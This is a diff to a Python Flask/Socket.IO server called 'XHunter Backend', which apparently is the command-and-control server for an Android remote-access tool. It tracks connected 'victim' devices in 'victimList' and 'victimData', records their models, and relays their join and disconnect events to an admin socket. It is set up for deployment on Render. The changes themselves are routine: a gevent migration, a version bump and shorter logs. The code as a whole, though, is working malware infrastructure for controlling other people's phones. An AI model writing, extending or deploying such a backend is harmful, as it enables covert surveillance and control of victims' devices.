@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-XHunter Backend Server - Production Ready
-Deploy: Render, Heroku, Railway, Koyeb
-Port: 10000 (Render default)
+XHunter Backend Server - Python 3.14 Compatible
+Deploy: Render
+Port: 10000
 """
 
-import eventlet
-eventlet.monkey_patch()
+from gevent import monkey
+monkey.patch_all()
 
 from flask import Flask, request as flask_request, jsonify
 from flask_socketio import SocketIO, emit
@@ -23,13 +23,12 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 socketio = SocketIO(
     app,
     cors_allowed_origins="*",
-    async_mode='eventlet',
+    async_mode='gevent',
     ping_timeout=60,
     ping_interval=25,
     max_http_buffer_size=100 * 1024 * 1024,
     transports=['websocket', 'polling'],
     allow_upgrades=True,
-    upgrade_timeout=10000,
     logger=False,
     engineio_logger=False
 )
@@ -47,16 +46,11 @@ adminSocketId = None
 def index():
     return jsonify({
         'server': 'XHunter Backend',
-        'version': '2.0.0',
+        'version': '2.0.1',
         'status': 'online',
         'devices_connected': len(victimList),
         'admin_connected': adminSocketId is not None,
-        'uptime': str(datetime.now()),
-        'endpoints': {
-            'health': '/health',
-            'devices': '/api/devices',
-            'socketio': 'wss://' + flask_request.host + '/socket.io/'
-        }
+        'time': datetime.now().isoformat()
     })
 
 @app.route('/health')
@@ -98,7 +92,7 @@ def on_connect(auth=None):
 def on_disconnect(reason=None):
     global adminSocketId
     sid = flask_request.sid
-    print(f"[DISCONNECT] {sid} | Reason: {reason}")
+    print(f"[DISCONNECT] {sid}")
 
     if sid == adminSocketId:
         adminSocketId = None
@@ -111,7 +105,7 @@ def on_disconnect(reason=None):
             victimData.pop(dev_id, None)
             if adminSocketId:
                 socketio.emit('disconnectClient', dev_id, to=adminSocketId)
-            print(f"[DEVICE] {dev_id} disconnected")
+            print(f"[DEVICE] {dev_id} left")
             break
 
 @socketio.on('adminJoin')
@@ -148,7 +142,7 @@ def on_device_join(data):
         'connectedAt': datetime.now().isoformat()
     }
 
-    print(f"[DEVICE] {dev_id} | {data.get('model', '?')} | Android {data.get('android', '?')}")
+    print(f"[DEVICE] {dev_id} | {data.get('model', '?')}")
 
     if adminSocketId:
         socketio.emit('join', victimData[dev_id], to=adminSocketId)
@@ -235,11 +229,5 @@ def on_ping(data=None):
 # ==================== MAIN ====================
 
 if __name__ == '__main__':
-    print(f"""
-    ╔══════════════════════════════════╗
-    ║   XHunter Backend v2.0         ║
-    ║   Port: {PORT}                    ║
-    ║   Production Ready             ║
-    ╚══════════════════════════════════╝
-    """)
+    print(f"XHunter Backend v2.0.1 - Port: {PORT}")
     socketio.run(app, host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
